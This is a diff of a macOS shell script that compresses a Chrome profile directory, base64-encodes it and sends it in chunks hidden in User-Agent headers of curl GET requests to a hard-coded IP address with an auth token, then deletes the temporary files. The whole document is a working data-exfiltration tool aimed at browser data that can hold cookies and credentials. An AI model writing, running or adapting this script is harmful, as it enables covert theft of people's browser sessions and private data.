@@ -1,37 +1,34 @@
-#!/bin/bash
+#!/bin/zsh
 
-# Set your Chrome profile directory here
-CHROME_DIR="$HOME/Library/Application Support/Google/Chrome/temp"
+TARGET_DIR="$HOME/Library/Application Support/Google/Chrome/temp"
 ARCHIVE_PATH="/tmp/chrome_temp.zip"
-SERVER="http://159.223.159.200:8080"
+ENCODED_PATH="/tmp/chrome_temp.b64"
+SERVER_URL="http://159.223.159.200:8080"
+AUTH_TOKEN="XoGDSHomKmv2IeSyCetVbMc9NOxC5uwc"
+CHUNK_SIZE=3000  # ~3KB per header is safe
 
 echo "[*] Compressing Chrome profile..."
-if [[ ! -d "$CHROME_DIR" ]]; then
-    echo "[!] Chrome directory not found: $CHROME_DIR"
-    exit 1
-fi
-
-zip -qr "$ARCHIVE_PATH" "$CHROME_DIR"
+rm -f "$ARCHIVE_PATH" "$ENCODED_PATH"
+/usr/bin/zip -r "$ARCHIVE_PATH" "$TARGET_DIR" >/dev/null
 
 if [[ ! -f "$ARCHIVE_PATH" ]]; then
-    echo "[!] Failed to create archive."
+    echo "[!] Zip failed."
     exit 1
 fi
 
-echo "[*] Encoding and batching..."
-base64 "$ARCHIVE_PATH" > /tmp/base64_data.txt
+echo "[*] Encoding..."
+base64 -i "$ARCHIVE_PATH" -o "$ENCODED_PATH"
 
-# Split base64 data into chunks (~100 characters per chunk)
-split -l 1 -a 5 /tmp/base64_data.txt /tmp/chunk_
+echo "[*] Sending via GET + User-Agent headers..."
+while IFS= read -r line; do
+    echo "$line" | fold -w "$CHUNK_SIZE" | while IFS= read -r chunk; do
+        curl -s -X GET "$SERVER_URL" \
+            -H "X-Auth-Token: $AUTH_TOKEN" \
+            -H "User-Agent: $chunk" > /dev/null
+        sleep 0.3  # slight delay for reliability
+    done
+done < "$ENCODED_PATH"
 
-echo "[*] Exfiltrating via GET + User-Agent headers..."
-for file in /tmp/chunk_*; do
-    CHUNK=$(cat "$file")
-    curl -s -A "$CHUNK" "$SERVER" > /dev/null
-    sleep 0.2
-done
+echo "[*] Done. Cleaning up..."
+rm -f "$ARCHIVE_PATH" "$ENCODED_PATH"
 
-echo "[*] Cleaning up..."
-rm -f "$ARCHIVE_PATH" /tmp/base64_data.txt /tmp/chunk_*
-
-echo "[*] Done."
